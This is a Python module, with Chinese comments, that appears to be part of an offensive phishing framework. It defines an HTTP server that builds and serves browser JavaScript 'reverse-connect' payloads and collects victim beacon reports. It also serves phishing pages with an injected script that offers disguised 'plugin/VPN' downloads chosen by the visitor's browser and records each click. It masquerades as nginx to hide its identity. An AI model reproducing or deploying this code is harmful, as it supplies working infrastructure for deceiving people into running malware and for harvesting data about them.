"""JS 分发 + 页面分发 HTTP 服务器(独立端口,headless)。

路由:
    GET  {route_payload}?m=<模块>&a=<JSON参数>    → 实时构建 JS 反连代码(浏览器下载即执行)
    POST {route_report}[?d=JSON]                  → 接收 JS report() 回传(Image beacon)
    GET  /                                        → 当前活动页面 index.html
    GET  /page/<name>                             → 指定页面 index.html
    GET  /pages/<name>/<file>                     → 页面内静态资源(css/js/图片,防穿越)
    GET  /health                                  → 状态

生命周期:start() 阻塞由调用方线程承载(bridge 起 headless 线程),
stop() 优雅关闭 —— 与 c2_server 的 PyExec2Server 模式一致。
"""

import json
import logging
import os
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Optional
from urllib.parse import parse_qs, unquote, urlsplit

from .builder import PayloadBuilder
from .config import PhishingConfig
from .module_loader import JsModuleLoader
from .page_renderer import PageRenderer

logger = logging.getLogger("phishing.server")

# 下载物选择器:注入每个页面。按访客 UA 匹配 downloads.json 中同 name 的条目,
# 动态把 <a data-download="名称"> 的 href 替换为真实地址;点击时回传所选下载物。
# 注:注入内容本身紧凑无注释(载荷)。
_DL_SELECTOR_JS = """(function(){
  var DL = window.__PH_DOWNLOADS__ || [];
  var ua = (navigator.userAgent || '').toLowerCase();
  var is = {
    edge:    ua.indexOf('edg') > -1,
    firefox: ua.indexOf('firefox') > -1,
    chrome:  ua.indexOf('chrome') > -1 && ua.indexOf('edg') < 0 && ua.indexOf('opr') < 0,
    safari:  ua.indexOf('safari') > -1 && ua.indexOf('chrome') < 0
  };
  function pick(name) {
    var cands = [];
    for (var i = 0; i < DL.length; i++) if (DL[i].name === name) cands.push(DL[i]);
    if (!cands.length) return '';
    for (var k in is) if (is[k])
      for (var j = 0; j < cands.length; j++)
        if (cands[j].ua === k) return cands[j].path;
    for (var m = 0; m < cands.length; m++) if (!cands[m].ua) return cands[m].path;
    return cands[0].path;
  }
  function fire(el, url) {
    var name = el.getAttribute('data-download') || '';
    try { report({ type: 'download_click', name: name, url: url, ua: (navigator.userAgent || '') }); } catch (e) {}
    if (!url) return;
    if (el.tagName.toLowerCase() === 'a') { el.href = url; return; }
    var a = document.createElement('a');
    a.href = url;
    a.download = url.split('/').pop() || '';
    document.body.appendChild(a); a.click(); document.body.removeChild(a);
  }
  var els = document.querySelectorAll('a[data-download], button[data-download]');
  for (var n = 0; n < els.length; n++) (function (el) {
    var url = pick(el.getAttribute('data-download'));
    if (el.tagName.toLowerCase() === 'a' && url) el.href = url;
    el.addEventListener('click', function () {
      fire(el, pick(el.getAttribute('data-download')));
    });
  })(els[n]);
})();"""


class PhishingServer:
    """钓鱼页面服务器:JS 反连 + 静态页面分发。"""

    def __init__(self, config: PhishingConfig,
                 report_callback=None, host_override: str = ""):
        self._config = config
        # report_callback(payload: dict, ip: str, ua: str) -> None;由 bridge 注入 Redis 落库
        self._report_callback = report_callback
        # 对外反连地址(面板配置的宿主地址;空则用配置 host)
        self._host_override = host_override
        self._loader = JsModuleLoader(config.resolve_path(config.modules_dir))
        self._loader.load()
        self._builder = PayloadBuilder(self._loader, config)
        self._pages = PageRenderer(config.resolve_path(config.pages_dir))
        self._httpd: Optional[ThreadingHTTPServer] = None
        self._running = False
        self._start_error = ""

    # ── 状态 ──

    @property
    def running(self) -> bool:
        return self._running

    @property
    def port(self) -> int:
        """实际监听端口(端口 0 动态绑定时返回实际值)。"""
        if self._httpd:
            try:
                return int(self._httpd.server_address[1])
            except Exception:
                pass
        return int(self._config.port)

    @property
    def config(self) -> PhishingConfig:
        return self._config

    @property
    def modules(self) -> list:
        return self._loader.list_modules()

    @property
    def pages(self) -> list:
        return self._pages.list_pages()

    @property
    def active_page(self) -> str:
        return self._pages.active_page(self._config)

    def _load_downloads(self) -> list:
        """读取下载物列表(downloads.json,与 config 同目录)。"""
        try:
            from .downloads import load_downloads
            return load_downloads(self._config)
        except Exception:
            return []

    def downloads_dir(self) -> str:
        """共享下载文件目录(所有页面共用;不存在则创建)。"""
        base = getattr(self._config, "base_dir", "") or "."
        d = os.path.join(base, "downloads_files")
        try:
            os.makedirs(d, exist_ok=True)
        except OSError:
            pass
        return d

    def list_download_files(self) -> list:
        """共享下载目录内文件列表。"""
        d = self.downloads_dir()
        try:
            return sorted(f for f in os.listdir(d)
                          if os.path.isfile(os.path.join(d, f))
                          and not f.startswith("."))
        except OSError:
            return []

    def write_download_file(self, filename: str, content: str) -> tuple:
        """写入共享下载目录文件(FS3B64 前缀=二进制;白名单扩展名;防穿越)。"""
        if not filename:
            return False, "文件名不能为空"
        if "/" in filename or "\\" in filename or ".." in filename:
            return False, "文件名非法"
        ext = os.path.splitext(filename)[1].lower()
        from .page_renderer import _ALLOWED_EXTS
        if ext not in _ALLOWED_EXTS:
            return False, f"只允许: {sorted(_ALLOWED_EXTS)}"
        d = self.downloads_dir()
        path = os.path.join(d, filename)
        try:
            if isinstance(content, str) and content.startswith("FS3B64:"):
                import base64
                data = base64.b64decode(content[len("FS3B64:"):].strip())
                with open(path, "wb") as f:
                    f.write(data)
            else:
                with open(path, "w", encoding="utf-8") as f:
                    f.write(str(content or ""))
        except OSError as e:
            return False, f"写入失败: {e}"
        except Exception as e:
            return False, f"写入失败: {e}"
        return True, f"已上传到共享下载目录: {filename}"

    def delete_download_file(self, filename: str) -> tuple:
        """删除共享下载目录文件(防穿越)。"""
        if not filename:
            return False, "文件名不能为空"
        if "/" in filename or "\\" in filename or ".." in filename:
            return False, "文件名非法"
        path = os.path.join(self.downloads_dir(), filename)
        if not os.path.isfile(path):
            return False, f"文件 {filename} 不存在"
        try:
            os.remove(path)
        except OSError as e:
            return False, f"删除失败: {e}"
        return True, f"已删除 {filename}"

    def status(self) -> dict:
        return {
            "ok": True,
            "running": self._running,
            "port": self.port,
            "host": self._host_override or self._config.host,
            "module_count": len(self._loader.list_modules()),
            "page_count": len(self._pages.list_pages()),
            "active_page": self.active_page,
            "default_module": self._config.default_module,
            "download_file": self._config.download_file,
            "route_payload": self._config.route_payload,
            "route_report": self._config.route_report,
            "config": {
                "host": self._config.host,
                "port": self._config.port,
                "route_payload": self._config.route_payload,
                "route_report": self._config.route_report,
                "default_module": self._config.default_module,
                "active_page": self.active_page,
                "download_file": self._config.download_file,
                "report_max": self._config.report_max,
                "max_payload_bytes": self._config.max_payload_bytes,
            },
        }

    def reload_modules(self) -> None:
        self._loader.reload()

    # ── 生命周期 ──

    def start(self) -> bool:
        """启动 HTTP 服务(bind 失败返回 False 并记录错误,不崩溃)。阻塞由调用方线程承载。"""
        if self._httpd is not None:
            return True
        try:
            self._httpd = ThreadingHTTPServer(
                (self._config.host, self._config.port), _make_handler(self))
            self._httpd.daemon_threads = True
        except OSError as e:
            self._start_error = f"端口 {self._config.port} 绑定失败: {e}"
            logger.error("%s", self._start_error)
            self._httpd = None
            return False
        self._start_error = ""
        self._running = True
        logger.info("phishing server listening on %s:%d",
                    self._config.host, self.port)
        try:
            self._httpd.serve_forever(poll_interval=0.5)
        finally:
            self._running = False
        return True

    def stop(self) -> None:
        if self._httpd is not None:
            try:
                self._httpd.shutdown()
                self._httpd.server_close()
            except Exception as e:
                logger.warning("server stop: %s", e)
            self._httpd = None
        self._running = False


def _make_handler(server: PhishingServer):
    """按 server 实例生成 handler 类(闭包持有引用)。"""
    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"
        # Server 头伪装为通用 nginx,不暴露产品名与 Python 版本
        # (BaseHTTPRequestHandler 默认还会拼 sys_version="Python/x.y",必须一并覆盖)
        server_version = "nginx"
        sys_version = ""

        def version_string(self):  # 直接覆写,避免 "nginx " 尾随空格
            return "nginx"

        def log_message(self, fmt, *args):  # 静默默认 stderr 日志
            pass

        # ── 路由 ──

        def _dispatch(self):
            t0 = time.time()
            parts = urlsplit(self.path)
            path = unquote(parts.path)
            query = parse_qs(parts.query, keep_blank_values=True)
            q = {k: v[0] for k, v in query.items()}
            try:
                if self.command == "GET" and path == server._config.route_payload:
                    self._handle_payload(q)
                elif self.command in ("GET", "POST") and path == server._config.route_report:
                    # GET = 老浏览器 Image beacon 回退(?d=JSON);POST = sendBeacon 主路径(body JSON)
                    self._handle_report(q)
                elif self.command == "GET" and path == "/":
                    self._handle_index()
                elif self.command == "GET" and path == "/health":
                    self._handle_health()
                elif self.command == "GET" and path.startswith("/pages/"):
                    # 仅放行当前活动页面的资源(移除指定访问页面功能:选中的页面才能访问)
                    self._handle_page_file(path[len("/pages/"):].strip("/"))
                elif self.command == "GET" and path.startswith("/download/"):
                    self._handle_download(path[len("/download/"):].strip("/"))
                elif self.command == "GET" and path.startswith("/page/"):
                    # 仅放行当前活动页面(其余 404)
                    name = path[len("/page/"):].strip("/")
                    if name != server.active_page:
                        self._send_text(404, "text/plain; charset=utf-8", "not found")
                        return
                    self._handle_page(name)
                else:
                    self._send_text(404, "text/plain; charset=utf-8", "not found")
            except (BrokenPipeError, ConnectionResetError):
                pass
            except Exception as e:
                logger.warning("handler error %s %s: %s", self.command, path, e)
                try:
                    self._send_text(500, "text/plain; charset=utf-8",
                                    f"server error: {e}")
                except Exception:
                    pass
            # 请求日志
            ua = (self.headers.get("User-Agent") or "")[:120]
            src = self.client_address[0] if self.client_address else "-"
            logger.info("%.3fs %s %s src=%s ua=%s",
                        time.time() - t0, self.command, path, src, ua)

        # ── JS 反连 ──

        def _handle_payload(self, q):
            name = (q.get("m") or server._config.default_module or "").strip()
            params = {}
            if q.get("a"):
                try:
                    params = json.loads(q["a"])
                    if not isinstance(params, dict):
                        params = {}
                except json.JSONDecodeError:
                    self._send_text(400, "text/plain; charset=utf-8",
                                    "参数 a 必须是 JSON 对象")
                    return
            res = server._builder.build(name, params,
                                        host=q.get("host") or server._host_override,
                                        port=q.get("port") if q.get("port") else None)
            if not res.get("ok"):
                self._send_text(400, "text/plain; charset=utf-8",
                                res.get("error", "build failed"))
                return
            self._send_bytes(200, "application/javascript; charset=utf-8",
                             res["code"].encode("utf-8"))

        # ── 回传 ──

        def _handle_report(self, q):
            payload = {}
            if q.get("d"):
                try:
                    payload = json.loads(q["d"])
                    if not isinstance(payload, dict):
                        payload = {}
                except json.JSONDecodeError:
                    pass
            # 读取 body(Content-Length 以内,防超大)
            try:
                clen = int(self.headers.get("Content-Length") or 0)
                if 0 < clen <= 1_048_576:
                    body = self.rfile.read(clen)
                    if body:
                        try:
                            bj = json.loads(body.decode("utf-8", "replace"))
                            if isinstance(bj, dict):
                                payload.update(bj)
                        except json.JSONDecodeError:
                            pass
            except Exception:
                pass
            src = self.client_address[0] if self.client_address else ""
            ua = (self.headers.get("User-Agent") or "")[:200]
            if server._report_callback is not None:
                try:
                    server._report_callback(payload, src, ua)
                except Exception as e:
                    logger.warning("report callback failed: %s", e)
            self._send_text(200, "application/json; charset=utf-8",
                            '{"ok":true}')

        # ── 页面 ──

        def _handle_index(self):
            name = server.active_page
            if not name:
                self._send_text(404, "text/plain; charset=utf-8",
                                "no active page configured")
                return
            self._handle_page(name)

        def _handle_page(self, name):
            # 页面 {{host}} 占位符显示对外反连地址(host_override 优先于监听地址)
            cfg = server._config
            if server._host_override:
                import copy
                cfg = copy.copy(server._config)
                cfg.host = server._host_override
            res = server._pages.render_index(name, cfg)
            if not res:
                self._send_text(404, "text/plain; charset=utf-8",
                                f"page '{name}' not found")
                return
            html = res["html"]
            # 注入下载物列表 + UA 选择器(页面"下载插件/下载 VPN"按钮用)
            dls = server._load_downloads()
            inject = ('<script>window.__PH_DOWNLOADS__ = '
                      f"{json.dumps(dls, ensure_ascii=False)};</script>\n"
                      f"<script>{_DL_SELECTOR_JS}</script>")
            if "</head>" in html:
                html = html.replace("</head>", inject + "</head>", 1)
            else:
                html = inject + html
            self._send_bytes(200, res["mime"], html.encode("utf-8"))

        def _handle_page_file(self, rest):
            # 仅放行当前活动页面的资源,其余 404(移除指定访问页面功能)
            if "/" not in rest:
                self._send_text(404, "text/plain; charset=utf-8", "not found")
                return
            name, file = rest.split("/", 1)
            if name != server.active_page:
                self._send_text(404, "text/plain; charset=utf-8", "not found")
                return
            res = server._pages.serve_file(name, file, server._config)
            if not res:
                self._send_text(404, "text/plain; charset=utf-8", "not found")
                return
            self._send_bytes(200, res["mime"], res["data"])

        def _handle_download(self, rest):
            """下载文件:仅当前活动页面目录内、且文件名在下载物配置(/download/ 前缀 path)中。

            路径格式 /download/<file>。用于钓鱼页面"下载插件/下载 VPN"按钮,
            支持多下载物(downloads.json 中任何 path 以 /download/ 开头的条目),
            兼容单文件配置 download_file;防任意路径下载。
            """
            if "/" in rest or ".." in rest:
                self._send_text(404, "text/plain; charset=utf-8", "not found")
                return
            # 收集允许下载的文件名:downloads.json 中 path 为 /download/<file> 的条目
            allowed = set()
            for d in server._load_downloads():
                p = str(d.get("path") or "")
                if p.startswith("/download/"):
                    fname = p[len("/download/"):].strip("/")
                    if fname and "/" not in fname and ".." not in fname:
                        allowed.add(fname)
            # 兼容旧配置:单文件 download_file
            dfile = server._config.download_file or ""
            if dfile:
                allowed.add(dfile)
            # 共享下载目录中的文件自动允许下载(上传即用,免手动登记)
            for f in server.list_download_files():
                allowed.add(f)
            if rest not in allowed:
                self._send_text(404, "text/plain; charset=utf-8", "not found")
                return
            # 文件位于共享下载目录 downloads_files/(所有页面共用,不依赖 active_page)
            dfile = rest
            path = os.path.join(server.downloads_dir(), dfile)
            if not os.path.isfile(path):
                self._send_text(404, "text/plain; charset=utf-8", "not found")
                return
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except OSError:
                self._send_text(404, "text/plain; charset=utf-8", "not found")
                return
            # 二进制下载:Content-Disposition attachment,浏览器触发下载
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Content-Disposition",
                             f'attachment; filename="{dfile}"')
            self.send_header("Cache-Control", "no-store")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(data)

        # ── 健康检查 ──

        def _handle_health(self):
            body = json.dumps({
                "ok": True, "running": server._running,
                "port": server.port, "modules": len(server.modules),
                "pages": len(server.pages),
                "active_page": server.active_page,
            }, ensure_ascii=False)
            self._send_bytes(200, "application/json; charset=utf-8",
                             body.encode("utf-8"))

        # ── 响应 ──

        def _send_text(self, code, ctype, text):
            self._send_bytes(code, ctype, text.encode("utf-8"))

        def _send_bytes(self, code, ctype, data):
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Cache-Control", "no-store")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(data)

        def do_GET(self):
            self._dispatch()

        def do_POST(self):
            self._dispatch()

        def do_OPTIONS(self):
            self.send_response(204)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type")
            self.send_header("Content-Length", "0")
            self.end_headers()

    return Handler
